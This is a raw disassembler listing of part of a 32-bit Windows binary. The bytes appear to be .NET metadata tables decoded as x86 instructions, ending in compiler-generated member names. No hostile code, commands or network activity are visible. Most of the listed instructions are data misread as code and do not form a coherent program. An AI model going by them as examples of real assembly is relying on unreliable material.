100025d6:	00 01                	add    %al,(%ecx)
100025d8:	57                   	push   %edi
100025d9:	1d 02 14 09 0a       	sbb    $0xa091402,%eax
100025de:	00 00                	add    %al,(%eax)
100025e0:	00 fa                	add    %bh,%dl
100025e2:	01 33                	add    %esi,(%ebx)
100025e4:	00 16                	add    %dl,(%esi)
100025e6:	00 00                	add    %al,(%eax)
100025e8:	01 00                	add    %eax,(%eax)
100025ea:	00 00                	add    %al,(%eax)
100025ec:	1b 00                	sbb    (%eax),%eax
100025ee:	00 00                	add    %al,(%eax)
100025f0:	05 00 00 00 17       	add    $0x17000000,%eax
100025f5:	00 00                	add    %al,(%eax)
100025f7:	00 1d 00 00 00 2d    	add    %bl,0x2d000000
100025fd:	00 00                	add    %al,(%eax)
100025ff:	00 24 00             	add    %ah,(%eax,%eax,1)
10002602:	00 00                	add    %al,(%eax)
10002604:	07                   	pop    %es
10002605:	00 00                	add    %al,(%eax)
10002607:	00 04 00             	add    %al,(%eax,%eax,1)
1000260a:	00 00                	add    %al,(%eax)
1000260c:	08 00                	or     %al,(%eax)
1000260e:	00 00                	add    %al,(%eax)
10002610:	03 00                	add    (%eax),%eax
10002612:	00 00                	add    %al,(%eax)
10002614:	0b 00                	or     (%eax),%eax
10002616:	00 00                	add    %al,(%eax)
10002618:	01 00                	add    %eax,(%eax)
1000261a:	00 00                	add    %al,(%eax)
1000261c:	04 00                	add    $0x0,%al
1000261e:	00 00                	add    %al,(%eax)
10002620:	03 00                	add    (%eax),%eax
10002622:	00 00                	add    %al,(%eax)
10002624:	01 00                	add    %eax,(%eax)
10002626:	00 00                	add    %al,(%eax)
10002628:	00 00                	add    %al,(%eax)
1000262a:	f0 03 01             	lock add (%ecx),%eax
1000262d:	00 00                	add    %al,(%eax)
1000262f:	00 00                	add    %al,(%eax)
10002631:	00 06                	add    %al,(%esi)
10002633:	00 f9                	add    %bh,%cl
10002635:	02 22                	add    (%edx),%ah
10002637:	05 06 00 19 03       	add    $0x3190006,%eax
1000263c:	22 05 06 00 e5 02    	and    0x2e50006,%al
10002642:	e5 04                	in     $0x4,%eax
10002644:	0f 00 42 05          	sldt   0x5(%edx)
10002648:	00 00                	add    %al,(%eax)
1000264a:	06                   	push   %es
1000264b:	00 ba 05 39 04 06    	add    %bh,0x6043905(%edx)
10002651:	00 55 01             	add    %dl,0x1(%ebp)
10002654:	55                   	push   %ebp
10002655:	03 0a                	add    (%edx),%ecx
10002657:	00 4b 04             	add    %cl,0x4(%ebx)
1000265a:	61                   	popa
1000265b:	05 0e 00 0d 04       	add    $0x40d000e,%eax
10002660:	51                   	push   %ecx
10002661:	05 06 00 83 04       	add    $0x4830006,%eax
10002666:	39 04 12             	cmp    %eax,(%edx,%edx,1)
10002669:	00 00                	add    %al,(%eax)
1000266b:	02 90 03 06 00 5f    	add    0x5f000603(%eax),%dl
10002671:	01 39                	add    %edi,(%ecx)
10002673:	04 06                	add    $0x6,%al
10002675:	00 6c 02 39          	add    %ch,0x39(%edx,%eax,1)
10002679:	04 06                	add    $0x6,%al
1000267b:	00 b8 02 39 04 06    	add    %bh,0x6043902(%eax)
10002681:	00 f2                	add    %dh,%dl
10002683:	05 39 04 06 00       	add    $0x60439,%eax
10002688:	b9 03 39 04 06       	mov    $0x6043903,%ecx
1000268d:	00 ca                	add    %cl,%dl
1000268f:	02 22                	add    (%edx),%ah
10002691:	05 06 00 11 06       	add    $0x6110006,%eax
10002696:	55                   	push   %ebp
10002697:	03 06                	add    (%esi),%eax
10002699:	00 de                	add    %bl,%dh
1000269b:	04 39                	add    $0x39,%al
1000269d:	04 0e                	add    $0xe,%al
1000269f:	00 75 04             	add    %dh,0x4(%ebp)
100026a2:	51                   	push   %ecx
100026a3:	05 0e 00 a3 01       	add    $0x1a3000e,%eax
100026a8:	51                   	push   %ecx
100026a9:	05 0e 00 85 05       	add    $0x585000e,%eax
100026ae:	51                   	push   %ecx
100026af:	05 06 00 37 03       	add    $0x3370006,%eax
100026b4:	39 04 06             	cmp    %eax,(%esi,%eax,1)
100026b7:	00 1c 04             	add    %bl,(%esp,%eax,1)
100026ba:	81 00 06 00 98 04    	addl   $0x4980006,(%eax)
100026c0:	39 04 06             	cmp    %eax,(%esi,%eax,1)
100026c3:	00 e4                	add    %ah,%ah
100026c5:	01 39                	add    %edi,(%ecx)
100026c7:	04 06                	add    $0x6,%al
100026c9:	00 89 03 39 04 06    	add    %cl,0x6043903(%ecx)
100026cf:	00 d0                	add    %dl,%al
100026d1:	03 03                	add    (%ebx),%eax
100026d3:	05 00 00 00 00       	add    $0x0,%eax
100026d8:	45                   	inc    %ebp
100026d9:	00 00                	add    %al,(%eax)
100026db:	00 00                	add    %al,(%eax)
100026dd:	00 01                	add    %al,(%ecx)
100026df:	00 01                	add    %al,(%ecx)
100026e1:	00 01                	add    %al,(%ecx)
100026e3:	00 00                	add    %al,(%eax)
100026e5:	00 b8 01 d0 04 15    	add    %bh,0x1504d001(%eax)
100026eb:	00 01                	add    %al,(%ecx)
100026ed:	00 01                	add    %al,(%ecx)
100026ef:	00 0b                	add    %cl,(%ebx)
100026f1:	01 10                	add    %edx,(%eax)
100026f3:	00 94 00 00 00 31 00 	add    %dl,0x310000(%eax,%eax,1)
100026fa:	0c 00                	or     $0x0,%al
100026fc:	16                   	push   %ss
100026fd:	00 03                	add    %al,(%ebx)
100026ff:	01 00                	add    %eax,(%eax)
10002701:	00 8a 02 00 00 35    	add    %cl,0x35000002(%edx)
10002707:	00 16                	add    %dl,(%esi)
10002709:	00 16                	add    %dl,(%esi)
1000270b:	00 03                	add    %al,(%ebx)
1000270d:	21 10                	and    %edx,(%eax)
1000270f:	00 f3                	add    %dh,%bl
10002711:	00 00                	add    %al,(%eax)
10002713:	00 15 00 16 00 1a    	add    %dl,0x1a001600
10002719:	00 51 80             	add    %dl,-0x80(%ecx)
1000271c:	8b 00                	mov    (%eax),%eax
1000271e:	0f 01 51 80          	lgdtl  -0x80(%ecx)
10002722:	4e                   	dec    %esi
10002723:	00 0f                	add    %cl,(%edi)
10002725:	01 51 80             	add    %edx,-0x80(%ecx)
10002728:	af                   	scas   %es:(%edi),%eax
10002729:	00 0f                	add    %cl,(%edi)
1000272b:	01 51 80             	add    %edx,-0x80(%ecx)
1000272e:	70 00                	jo     0x10002730
10002730:	0f 01 51 80          	lgdtl  -0x80(%ecx)
10002734:	9d                   	popf
10002735:	00 0f                	add    %cl,(%edi)
10002737:	01 51 80             	add    %edx,-0x80(%ecx)
1000273a:	c0 00 0f             	rolb   $0xf,(%eax)
1000273d:	01 51 80             	add    %edx,-0x80(%ecx)
10002740:	59                   	pop    %ecx
10002741:	00 12                	add    %dl,(%edx)
10002743:	01 11                	add    %edx,(%ecx)
10002745:	00 03                	add    %al,(%ebx)
10002747:	01 15 01 11 00 69    	add    %edx,0x69001101
1000274d:	01 17                	add    %edx,(%edi)
1000274f:	00 11                	add    %dl,(%ecx)
10002751:	00 4a 01             	add    %cl,0x1(%edx)
10002754:	19 01                	sbb    %eax,(%ecx)
10002756:	11 00                	adc    %eax,(%eax)
10002758:	48                   	dec    %eax
10002759:	03 1d 01 06 00 1c    	add    0x1c000601,%ebx
1000275f:	02 12                	add    (%edx),%dl
10002761:	01 06                	add    %eax,(%esi)
10002763:	00 f7                	add    %dh,%bh
10002765:	00 17                	add    %dl,(%edi)
10002767:	00 06                	add    %al,(%esi)
10002769:	00 df                	add    %bl,%bh
1000276b:	00 0f                	add    %cl,(%edi)
1000276d:	01 06                	add    %eax,(%esi)
1000276f:	00 d4                	add    %dl,%ah
10002771:	00 0f                	add    %cl,(%edi)
10002773:	01 06                	add    %eax,(%esi)
10002775:	00 99 01 17 00 06    	add    %bl,0x6001701(%ecx)
1000277b:	00 57 04             	add    %dl,0x4(%edi)
1000277e:	17                   	pop    %ss
1000277f:	00 06                	add    %al,(%esi)
10002781:	00 b0 04 17 00 06    	add    %dh,0x6001704(%eax)
10002787:	00 73 01             	add    %dh,0x1(%ebx)
1000278a:	17                   	pop    %ss
1000278b:	00 06                	add    %al,(%esi)
1000278d:	00 52 02             	add    %dl,0x2(%edx)
10002790:	20 01                	and    %al,(%ecx)
10002792:	06                   	push   %es
10002793:	00 44 02 20          	add    %al,0x20(%edx,%eax,1)
10002797:	01 36                	add    %esi,(%esi)
10002799:	00 41 00             	add    %al,0x0(%ecx)
1000279c:	23 01                	and    (%ecx),%eax
1000279e:	16                   	push   %ss
1000279f:	00 10                	add    %dl,(%eax)
100027a1:	00 27                	add    %ah,(%edi)
100027a3:	01 50 20             	add    %edx,0x20(%eax)
100027a6:	00 00                	add    %al,(%eax)
100027a8:	00 00                	add    %al,(%eax)
100027aa:	91                   	xchg   %eax,%ecx
100027ab:	18 c9                	sbb    %cl,%cl
100027ad:	04 2b                	add    $0x2b,%al
100027af:	01 01                	add    %eax,(%ecx)
100027b1:	00 00                	add    %al,(%eax)
100027b3:	00 00                	add    %al,(%eax)
100027b5:	00 80 00 91 20 36    	add    %al,0x36209100(%eax)
100027bb:	06                   	push   %es
100027bc:	2f                   	das
100027bd:	01 01                	add    %eax,(%ecx)
100027bf:	00 00                	add    %al,(%eax)
100027c1:	00 00                	add    %al,(%eax)
100027c3:	00 80 00 91 20 a7    	add    %al,-0x58df6f00(%eax)
100027c9:	06                   	push   %es
100027ca:	34 01                	xor    $0x1,%al
100027cc:	02 00                	add    (%eax),%al
100027ce:	00 00                	add    %al,(%eax)
100027d0:	00 00                	add    %al,(%eax)
100027d2:	80 00 91             	addb   $0x91,(%eax)
100027d5:	20 7f 06             	and    %bh,0x6(%edi)
100027d8:	44                   	inc    %esp
100027d9:	01 0e                	add    %ecx,(%esi)
100027db:	00 00                	add    %al,(%eax)
100027dd:	00 00                	add    %al,(%eax)
100027df:	00 80 00 91 20 4d    	add    %al,0x4d209100(%eax)
100027e5:	06                   	push   %es
100027e6:	4a                   	dec    %edx
100027e7:	01 10                	add    %edx,(%eax)
100027e9:	00 00                	add    %al,(%eax)
100027eb:	00 00                	add    %al,(%eax)
100027ed:	00 80 00 91 20 9c    	add    %al,-0x63df6f00(%eax)
100027f3:	05 4f 01 11 00       	add    $0x11014f,%eax
100027f8:	00 00                	add    %al,(%eax)
100027fa:	00 00                	add    %al,(%eax)
100027fc:	80 00 91             	addb   $0x91,(%eax)
100027ff:	20 8a 06 4a 01 12    	and    %cl,0x12014a06(%edx)
10002805:	00 00                	add    %al,(%eax)
10002807:	00 00                	add    %al,(%eax)
10002809:	00 80 00 91 20 0c    	add    %al,0xc209100(%eax)
1000280f:	01 56 01             	add    %edx,0x1(%esi)
10002812:	13 00                	adc    (%eax),%eax
10002814:	00 00                	add    %al,(%eax)
10002816:	00 00                	add    %al,(%eax)
10002818:	80 00 91             	addb   $0x91,(%eax)
1000281b:	20 b8 04 2f 01 17    	and    %bh,0x17012f04(%eax)
10002821:	00 00                	add    %al,(%eax)
10002823:	00 00                	add    %al,(%eax)
10002825:	00 80 00 91 20 db    	add    %al,-0x24df6f00(%eax)
1000282b:	06                   	push   %es
1000282c:	5e                   	pop    %esi
1000282d:	01 18                	add    %ebx,(%eax)
1000282f:	00 00                	add    %al,(%eax)
10002831:	00 00                	add    %al,(%eax)
10002833:	00 80 00 91 20 f0    	add    %al,-0xfdf6f00(%eax)
10002839:	01 64 01 1a          	add    %esp,0x1a(%ecx,%eax,1)
1000283d:	00 00                	add    %al,(%eax)
1000283f:	00 00                	add    %al,(%eax)
10002841:	00 80 00 91 20 66    	add    %al,0x66209100(%eax)
10002847:	03 69 01             	add    0x1(%ecx),%ebp
1000284a:	1b 00                	sbb    (%eax),%eax
1000284c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1000284d:	20 00                	and    %al,(%eax)
1000284f:	00 00                	add    %al,(%eax)
10002851:	00 91 00 a5 04 69    	add    %dl,0x6904a500(%ecx)
10002857:	01 1c 00             	add    %ebx,(%eax,%eax,1)
1000285a:	6c                   	insb   (%dx),%es:(%edi)
1000285b:	21 00                	and    %eax,(%eax)
1000285d:	00 00                	add    %al,(%eax)
1000285f:	00 91 00 1d 06 2b    	add    %dl,0x2b061d00(%ecx)
10002865:	01 1d 00 30 22 00    	add    %ebx,0x223000
1000286b:	00 00                	add    %al,(%eax)
1000286d:	00 91 00 29 06 2b    	add    %dl,0x2b062900(%ecx)
10002873:	01 1d 00 a8 22 00    	add    %ebx,0x22a800
10002879:	00 00                	add    %al,(%eax)
1000287b:	00 91 00 5a 06 2b    	add    %dl,0x2b065a00(%ecx)
10002881:	01 1d 00 f0 23 00    	add    %ebx,0x23f000
10002887:	00 00                	add    %al,(%eax)
10002889:	00 91 00 6c 06 2b    	add    %dl,0x2b066c00(%ecx)
1000288f:	01 1d 00 28 24 00    	add    %ebx,0x242800
10002895:	00 00                	add    %al,(%eax)
10002897:	00 91 00 fb 00 56    	add    %dl,0x5600fb00(%ecx)
1000289d:	01 1d 00 58 24 00    	add    %ebx,0x245800
100028a3:	00 00                	add    %al,(%eax)
100028a5:	00 91 00 34 01 2b    	add    %dl,0x2b013400(%ecx)
100028ab:	01 21                	add    %esp,(%ecx)
100028ad:	00 a8 24 00 00 00    	add    %ch,0x24(%eax)
100028b3:	00 91 00 1f 01 2b    	add    %dl,0x2b011f00(%ecx)
100028b9:	01 21                	add    %esp,(%ecx)
100028bb:	00 e6                	add    %ah,%dh
100028bd:	24 00                	and    $0x0,%al
100028bf:	00 00                	add    %al,(%eax)
100028c1:	00 86 18 c3 04 06    	add    %al,0x604c318(%esi)
100028c7:	00 21                	add    %ah,(%ecx)
100028c9:	00 00                	add    %al,(%eax)
100028cb:	00 00                	add    %al,(%eax)
100028cd:	00 03                	add    %al,(%ebx)
100028cf:	00 86 18 c3 04 1f    	add    %al,0x1f04c318(%esi)
100028d5:	00 21                	add    %ah,(%ecx)
100028d7:	00 00                	add    %al,(%eax)
100028d9:	00 00                	add    %al,(%eax)
100028db:	00 03                	add    %al,(%ebx)
100028dd:	00 c6                	add    %al,%dh
100028df:	01 dd                	add    %ebx,%ebp
100028e1:	01 6e 01             	add    %ebp,0x1(%esi)
100028e4:	23 00                	and    (%eax),%eax
100028e6:	00 00                	add    %al,(%eax)
100028e8:	00 00                	add    %al,(%eax)
100028ea:	03 00                	add    (%eax),%eax
100028ec:	c6 01 d8             	movb   $0xd8,(%ecx)
100028ef:	01 76 01             	add    %esi,0x1(%esi)
100028f2:	27                   	daa
100028f3:	00 00                	add    %al,(%eax)
100028f5:	00 00                	add    %al,(%eax)
100028f7:	00 03                	add    %al,(%ebx)
100028f9:	00 c6                	add    %al,%dh
100028fb:	01 ce                	add    %ecx,%esi
100028fd:	01 82 01 2d 00 ef    	add    %eax,-0x10ffd2ff(%edx)
10002903:	24 00                	and    $0x0,%al
10002905:	00 00                	add    %al,(%eax)
10002907:	00 91 18 c9 04 2b    	add    %dl,0x2b04c918(%ecx)
1000290d:	01 2e                	add    %ebp,(%esi)
1000290f:	00 e6                	add    %ah,%dh
10002911:	24 00                	and    $0x0,%al
10002913:	00 00                	add    %al,(%eax)
10002915:	00 86 18 c3 04 06    	add    %al,0x604c318(%esi)
1000291b:	00 2e                	add    %ch,(%esi)
1000291d:	00 fb                	add    %bh,%bl
1000291f:	24 00                	and    $0x0,%al
10002921:	00 00                	add    %al,(%eax)
10002923:	00 83 00 01 00 06    	add    %al,0x6000100(%ebx)
10002929:	00 2e                	add    %ch,(%esi)
1000292b:	00 08                	add    %cl,(%eax)
1000292d:	25 00 00 00 00       	and    $0x0,%eax
10002932:	83 00 1a             	addl   $0x1a,(%eax)
10002935:	00 06                	add    %al,(%esi)
10002937:	00 2e                	add    %ch,(%esi)
10002939:	00 00                	add    %al,(%eax)
1000293b:	00 01                	add    %al,(%ecx)
1000293d:	00 aa 05 00 00 01    	add    %ch,0x1000005(%edx)
10002943:	00 12                	add    %dl,(%edx)
10002945:	02 00                	add    (%eax),%al
10002947:	00 02                	add    %al,(%edx)
10002949:	00 38                	add    %bh,(%eax)
1000294b:	02 00                	add    (%eax),%al
1000294d:	00 03                	add    %al,(%ebx)
1000294f:	00 5f 02             	add    %bl,0x2(%edi)
10002952:	00 00                	add    %al,(%eax)
10002954:	04 00                	add    $0x0,%al
10002956:	0a 02                	or     (%edx),%al
10002958:	00 00                	add    %al,(%eax)
1000295a:	05 00 b4 06 00       	add    $0x6b400,%eax
1000295f:	00 06                	add    %al,(%esi)
10002961:	00 f2                	add    %dh,%dl
10002963:	06                   	push   %es
10002964:	00 00                	add    %al,(%eax)
10002966:	07                   	pop    %es
10002967:	00 b2 03 00 00 08    	add    %dh,0x8000003(%edx)
1000296d:	00 de                	add    %bl,%dh
1000296f:	05 00 00 09 00       	add    $0x90000,%eax
10002974:	06                   	push   %es
10002975:	06                   	push   %es
10002976:	00 00                	add    %al,(%eax)
10002978:	0a 00                	or     (%eax),%al
1000297a:	47                   	inc    %edi
1000297b:	06                   	push   %es
1000297c:	00 00                	add    %al,(%eax)
1000297e:	0b 00                	or     (%eax),%eax
10002980:	99                   	cltd
10002981:	01 00                	add    %eax,(%eax)
10002983:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002986:	2a 04 00             	sub    (%eax,%eax,1),%al
10002989:	00 01                	add    %al,(%ecx)
1000298b:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
1000298f:	00 02                	add    %al,(%edx)
10002991:	00 9e 06 00 00 01    	add    %bl,0x1000006(%esi)
10002997:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
1000299b:	00 01                	add    %al,(%ecx)
1000299d:	00 91 05 00 00 01    	add    %dl,0x1000005(%ecx)
100029a3:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
100029a7:	00 01                	add    %al,(%ecx)
100029a9:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
100029ad:	00 02                	add    %al,(%edx)
100029af:	00 9f 03 00 00 03    	add    %bl,0x3000003(%edi)
100029b5:	00 32                	add    %dh,(%edx)
100029b7:	04 00                	add    $0x0,%al
100029b9:	00 04 00             	add    %al,(%eax,%eax,1)
100029bc:	23 04 00             	and    (%eax,%eax,1),%eax
100029bf:	00 01                	add    %al,(%ecx)
100029c1:	00 98 06 00 00 01    	add    %bl,0x1000006(%eax)
100029c7:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
100029cb:	00 02                	add    %al,(%edx)
100029cd:	00 d0                	add    %dl,%al
100029cf:	06                   	push   %es
100029d0:	00 00                	add    %al,(%eax)
100029d2:	01 00                	add    %eax,(%eax)
100029d4:	22 02                	and    (%edx),%al
100029d6:	00 00                	add    %al,(%eax)
100029d8:	01 00                	add    %eax,(%eax)
100029da:	81 03 00 00 01 00    	addl   $0x10000,(%ebx)
100029e0:	2f                   	das
100029e1:	02 00                	add    (%eax),%al
100029e3:	00 01                	add    %al,(%ecx)
100029e5:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
100029e9:	00 02                	add    %al,(%edx)
100029eb:	00 a4 03 00 00 03 00 	add    %ah,0x30000(%ebx,%eax,1)
100029f2:	32 04 00             	xor    (%eax,%eax,1),%al
100029f5:	00 04 00             	add    %al,(%eax,%eax,1)
100029f8:	23 04 00             	and    (%eax,%eax,1),%eax
100029fb:	00 01                	add    %al,(%ecx)
100029fd:	00 c1                	add    %al,%cl
100029ff:	05 00 00 02 00       	add    $0x20000,%eax
10002a04:	92                   	xchg   %eax,%edx
10002a05:	01 00                	add    %eax,(%eax)
10002a07:	00 01                	add    %al,(%ecx)
10002a09:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
10002a0d:	00 02                	add    %al,(%edx)
10002a0f:	00 a4 03 00 00 03 00 	add    %ah,0x30000(%ebx,%eax,1)
10002a16:	32 04 00             	xor    (%eax,%eax,1),%al
10002a19:	00 04 00             	add    %al,(%eax,%eax,1)
10002a1c:	23 04 00             	and    (%eax,%eax,1),%eax
10002a1f:	00 01                	add    %al,(%ecx)
10002a21:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
10002a25:	00 02                	add    %al,(%edx)
10002a27:	00 a4 03 00 00 03 00 	add    %ah,0x30000(%ebx,%eax,1)
10002a2e:	32 04 00             	xor    (%eax,%eax,1),%al
10002a31:	00 04 00             	add    %al,(%eax,%eax,1)
10002a34:	23 04 00             	and    (%eax,%eax,1),%eax
10002a37:	00 05 00 c7 03 00    	add    %al,0x3c700
10002a3d:	00 06                	add    %al,(%esi)
10002a3f:	00 c1                	add    %al,%cl
10002a41:	05 00 00 01 00       	add    $0x10000,%eax
10002a46:	ff 05 09 00 c3 04    	incl   0x4c30009
10002a4c:	01 00                	add    %eax,(%eax)
10002a4e:	11 00                	adc    %eax,(%eax)
10002a50:	c3                   	ret
10002a51:	04 06                	add    $0x6,%al
10002a53:	00 19                	add    %bl,(%ecx)
10002a55:	00 c3                	add    %al,%bl
10002a57:	04 0a                	add    $0xa,%al
10002a59:	00 81 00 c3 04 06    	add    %al,0x604c300(%ecx)
10002a5f:	00 91 00 8d 04 17    	add    %dl,0x17048d00(%ecx)
10002a65:	00 39                	add    %bh,(%ecx)
10002a67:	00 40 04             	add    %al,0x4(%eax)
10002a6a:	1a 00                	sbb    (%eax),%al
10002a6c:	89 00                	mov    %eax,(%eax)
10002a6e:	c3                   	ret
10002a6f:	04 1f                	add    $0x1f,%al
10002a71:	00 31                	add    %dh,(%ecx)
10002a73:	00 c3                	add    %al,%bl
10002a75:	04 25                	add    $0x25,%al
10002a77:	00 31                	add    %dh,(%ecx)
10002a79:	00 81 01 2b 00 31    	add    %al,0x31002b01(%ecx)
10002a7f:	00 17                	add    %dl,(%edi)
10002a81:	06                   	push   %es
10002a82:	06                   	push   %es
10002a83:	00 41 00             	add    %al,0x0(%ecx)
10002a86:	c3                   	ret
10002a87:	04 40                	add    $0x40,%al
10002a89:	00 41 00             	add    %al,0x0(%ecx)
10002a8c:	63 04 06             	arpl   %eax,(%esi,%eax,1)
10002a8f:	00 b9 00 1a 01 4c    	add    %bh,0x4c011a00(%ecx)
10002a95:	00 c1                	add    %al,%cl
10002a97:	00 39                	add    %bh,(%ecx)
10002a99:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
10002a9d:	00 c8                	add    %cl,%al
10002a9f:	05 06 00 c9 00       	add    $0xc90006,%eax
10002aa4:	82 02 06             	addb   $0x6,(%edx)
10002aa7:	00 31                	add    %dh,(%ecx)
10002aa9:	00 92 04 64 00 91    	add    %dl,-0x6eff9bfc(%edx)
10002aaf:	00 b6 06 69 00 49    	add    %dh,0x49006906(%esi)
10002ab5:	00 c2                	add    %al,%dl
10002ab7:	01 6f 00             	add    %ebp,0x0(%edi)
10002aba:	d1 00                	roll   $1,(%eax)
10002abc:	b3 05                	mov    $0x5,%bl
10002abe:	73 00                	jae    0x10002ac0
10002ac0:	d9 00                	flds   (%eax)
10002ac2:	9a 02 8d 00 59 00 5c 	lcall  $0x5c00,$0x59008d02
10002ac9:	01 99 00 59 00 78    	add    %ebx,0x78005900(%ecx)
10002acf:	03 9e 00 91 00 c3    	add    -0x3cff6f00(%esi),%ebx
10002ad5:	04 01                	add    $0x1,%al
10002ad7:	00 39                	add    %bh,(%ecx)
10002ad9:	00 76 05             	add    %dh,0x5(%esi)
10002adc:	a3 00 39 00 f8       	mov    %eax,0xf8003900
10002ae1:	04 a9                	add    $0xa9,%al
10002ae3:	00 51 00             	add    %dl,0x0(%ecx)
10002ae6:	5d                   	pop    %ebp
10002ae7:	04 ae                	add    $0xae,%al
10002ae9:	00 51 00             	add    %dl,0x0(%ecx)
10002aec:	c8 00 b7 00          	enter  $0xb700,$0x0
10002af0:	51                   	push   %ecx
10002af1:	00 ce                	add    %cl,%dh
10002af3:	00 b7 00 51 00 a8    	add    %dh,-0x57ffaf00(%edi)
10002af9:	03 b7 00 51 00 d3    	add    -0x2cffaf00(%edi),%esi
10002aff:	05 b7 00 91 00       	add    $0x9100b7,%eax
10002b04:	c2 06 69             	ret    $0x6906
10002b07:	00 91 00 e6 05 c4    	add    %dl,-0x3bfa1a00(%ecx)
10002b0d:	00 31                	add    %dh,(%ecx)
10002b0f:	00 3c 03             	add    %bh,(%ebx,%eax,1)
10002b12:	c9                   	leave
10002b13:	00 31                	add    %dh,(%ecx)
10002b15:	00 52 04             	add    %dl,0x4(%edx)
10002b18:	cd 00                	int    $0x0
10002b1a:	29 00                	sub    %eax,(%eax)
10002b1c:	c3                   	ret
10002b1d:	04 06                	add    $0x6,%al
10002b1f:	00 08                	add    %cl,(%eax)
10002b21:	00 04 00             	add    %al,(%eax,%eax,1)
10002b24:	ec                   	in     (%dx),%al
10002b25:	00 08                	add    %cl,(%eax)
10002b27:	00 08                	add    %cl,(%eax)
10002b29:	00 f1                	add    %dh,%cl
10002b2b:	00 08                	add    %cl,(%eax)
10002b2d:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002b30:	f6 00 08             	testb  $0x8,(%eax)
10002b33:	00 10                	add    %dl,(%eax)
10002b35:	00 fb                	add    %bh,%bl
10002b37:	00 08                	add    %cl,(%eax)
10002b39:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b3c:	00 01                	add    %al,(%ecx)
10002b3e:	08 00                	or     %al,(%eax)
10002b40:	18 00                	sbb    %al,(%eax)
10002b42:	05 01 09 00 1c       	add    $0x1c000901,%eax
10002b47:	00 0a                	add    %cl,(%edx)
10002b49:	01 2e                	add    %ebp,(%esi)
10002b4b:	00 0b                	add    %cl,(%ebx)
10002b4d:	00 88 01 2e 00 13    	add    %cl,0x13002e01(%eax)
10002b53:	00 91 01 2e 00 1b    	add    %dl,0x1b002e01(%ecx)
10002b59:	00 b0 01 a3 00 23    	add    %dh,0x2300a301(%eax)
10002b5f:	00 b9 01 10 00 30    	add    %bh,0x30001001(%ecx)
10002b65:	00 5b 00             	add    %bl,0x0(%ebx)
10002b68:	79 00                	jns    0x10002b6a
10002b6a:	7f 00                	jg     0x10002b6c
10002b6c:	bb 00 bf 00 d2       	mov    $0xd200bf00,%ebx
10002b71:	00 02                	add    %al,(%edx)
10002b73:	04 e5                	add    $0xe5,%al
10002b75:	03 d8                	add    %eax,%ebx
10002b77:	03 40 01             	add    0x1(%eax),%eax
10002b7a:	05 00 36 06 01       	add    $0x1063600,%eax
10002b7f:	00 00                	add    %al,(%eax)
10002b81:	01 07                	add    %eax,(%edi)
10002b83:	00 a7 06 02 00 00    	add    %ah,0x206(%edi)
10002b89:	01 09                	add    %ecx,(%ecx)
10002b8b:	00 7f 06             	add    %bh,0x6(%edi)
10002b8e:	02 00                	add    (%eax),%al
10002b90:	00 01                	add    %al,(%ecx)
10002b92:	0b 00                	or     (%eax),%eax
10002b94:	4d                   	dec    %ebp
10002b95:	06                   	push   %es
10002b96:	02 00                	add    (%eax),%al
10002b98:	00 01                	add    %al,(%ecx)
10002b9a:	0d 00 9c 05 02       	or     $0x2059c00,%eax
10002b9f:	00 00                	add    %al,(%eax)
10002ba1:	01 0f                	add    %ecx,(%edi)
10002ba3:	00 8a 06 02 00 00    	add    %cl,0x206(%edx)
10002ba9:	01 11                	add    %edx,(%ecx)
10002bab:	00 0c 01             	add    %cl,(%ecx,%eax,1)
10002bae:	02 00                	add    (%eax),%al
10002bb0:	00 01                	add    %al,(%ecx)
10002bb2:	13 00                	adc    (%eax),%eax
10002bb4:	b8 04 02 00 00       	mov    $0x204,%eax
10002bb9:	01 15 00 db 06 02    	add    %edx,0x206db00
10002bbf:	00 00                	add    %al,(%eax)
10002bc1:	01 17                	add    %edx,(%edi)
10002bc3:	00 f0                	add    %dh,%al
10002bc5:	01 03                	add    %eax,(%ebx)
10002bc7:	00 00                	add    %al,(%eax)
10002bc9:	01 19                	add    %ebx,(%ecx)
10002bcb:	00 66 03             	add    %ah,0x3(%esi)
10002bce:	03 00                	add    (%eax),%eax
10002bd0:	04 80                	add    $0x80,%al
	...
10002be2:	d0 04 00             	rolb   $1,(%eax,%eax,1)
10002be5:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002bf0:	00 00                	add    %al,(%eax)
10002bf2:	da 00                	fiaddl (%eax)
10002bf4:	ea 00 00 00 00 00 04 	ljmp   $0x400,$0x0
	...
10002c03:	00 00                	add    %al,(%eax)
10002c05:	00 da                	add    %bl,%dl
10002c07:	00 61 05             	add    %ah,0x5(%ecx)
10002c0a:	00 00                	add    %al,(%eax)
10002c0c:	00 00                	add    %al,(%eax)
10002c0e:	04 00                	add    $0x0,%al
	...
10002c18:	00 00                	add    %al,(%eax)
10002c1a:	da 00                	fiaddl (%eax)
10002c1c:	76 02                	jbe    0x10002c20
10002c1e:	00 00                	add    %al,(%eax)
10002c20:	00 00                	add    %al,(%eax)
10002c22:	04 00                	add    $0x0,%al
	...
10002c2c:	00 00                	add    %al,(%eax)
10002c2e:	e3 00                	jecxz  0x10002c30
10002c30:	90                   	nop
10002c31:	03 00                	add    (%eax),%eax
10002c33:	00 00                	add    %al,(%eax)
10002c35:	00 03                	add    %al,(%ebx)
10002c37:	00 02                	add    %al,(%edx)
10002c39:	00 04 00             	add    %al,(%eax,%eax,1)
10002c3c:	02 00                	add    (%eax),%al
10002c3e:	05 00 02 00 2b       	add    $0x2b000200,%eax
10002c43:	00 94 00 00 00 00 3c 	add    %dl,0x3c000000(%eax,%eax,1)
10002c4a:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
10002c4e:	6f                   	outsl  %ds:(%esi),(%dx)
10002c4f:	72 3e                	jb     0x10002c8f
10002c51:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002c54:	30 5f 30             	xor    %bl,0x30(%edi)
10002c57:	00 3c 3e             	add    %bh,(%esi,%edi,1)
10002c5a:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
